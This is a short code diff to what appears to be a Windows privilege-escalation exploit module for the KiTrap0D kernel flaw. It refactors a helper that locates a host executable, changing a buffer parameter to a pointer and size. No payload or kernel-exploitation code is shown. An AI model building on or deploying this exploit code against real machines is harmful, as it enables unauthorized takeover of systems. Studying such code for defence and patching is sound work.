@@ -192,7 +192,7 @@ BOOL kitrap0d_spawn_ntvdm( char * cpProgram, HANDLE * hProcess )
 /*
  * Find a suitable exe to host the exploit in.
  */
-BOOL elevate_via_exploit_getpath( char cpOutput[MAX_PATH], DWORD dwOutputLength )
+BOOL elevate_via_exploit_getpath( char *cpOutput, DWORD dwOutputSize )
 {
 	DWORD dwResult         = ERROR_SUCCESS;
 	char cWinDir[MAX_PATH] = {0};
@@ -213,7 +213,7 @@ BOOL elevate_via_exploit_getpath( char cpOutput[MAX_PATH], DWORD dwOutputLength 
 			if( !cpFileName )
 				break;
 
-			if ( _snprintf_s( cpOutput, dwOutputLength, dwOutputLength - 1, "%s%s%s", cWinDir,
+			if ( _snprintf_s( cpOutput, dwOutputSize, dwOutputSize - 1, "%s%s%s", cWinDir,
 				 cWinDir[ strlen(cWinDir) - 1 ] == '\\' ? "" : "\\", cpFileName ) == -1 )
 			{
 				dprintf( "[KITRAP0D] elevate_via_exploit_getpath. Path truncation: %s", cpOutput );
@@ -225,7 +225,7 @@ BOOL elevate_via_exploit_getpath( char cpOutput[MAX_PATH], DWORD dwOutputLength 
 			if( GetFileAttributes( cpOutput ) != INVALID_FILE_ATTRIBUTES )
 				return TRUE;
 
-			memset( cpOutput, 0, dwOutputLength );
+			memset( cpOutput, 0, dwOutputSize );
 
 			dwIndex++;
 		}
@@ -268,7 +268,7 @@ DWORD elevate_via_exploit_kitrap0d( Remote * remote, Packet * packet )
 			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. invalid arguments", ERROR_BAD_ARGUMENTS );
 
 		// 1. first get a file path to a suitable exe...
-		if( !elevate_via_exploit_getpath( (char *)&cVdmPath, MAX_PATH ) )
+		if( !elevate_via_exploit_getpath( cVdmPath, MAX_PATH ) )
 			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_exploit_kitrap0d. elevate_via_exploit_getpath failed", ERROR_FILE_NOT_FOUND );
 
 		// 2. Scan kernel image for the required code sequence, and find the base address...
